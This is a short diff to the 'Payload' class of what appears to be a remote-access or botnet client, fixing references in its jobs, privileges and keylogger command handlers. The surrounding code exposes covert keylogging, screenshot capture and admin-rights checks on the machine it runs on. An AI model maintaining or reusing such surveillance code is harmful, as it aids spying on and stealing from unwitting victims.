@@ -466,7 +466,7 @@ class Payload():
         try:
             attribute = str(attribute)
             if 'jobs' in attribute:
-                return json.dumps({a: status(_threads[a].name) for a in self.handlers if self.handlers[a].is_alive()})
+                return json.dumps({a: status(self.handlers[a].name) for a in self.handlers if self.handlers[a].is_alive()})
             elif 'privileges' in attribute:
                 return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name == 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
             elif 'info' in attribute:
@@ -488,7 +488,7 @@ class Payload():
             else:
                 return self.show.usage
         except Exception as e:
-            log("'{}' error: {}".format(_threads.__name__, str(e)))
+            log("'{}' error: {}".format(self.show.__name__, str(e)))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
@@ -777,7 +777,7 @@ class Payload():
             elif 'status' in mode:
                 return locals()['status']()
             else:
-                return keylogger.usage
+                return globals()['keylogger'].usage
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='screenshot')
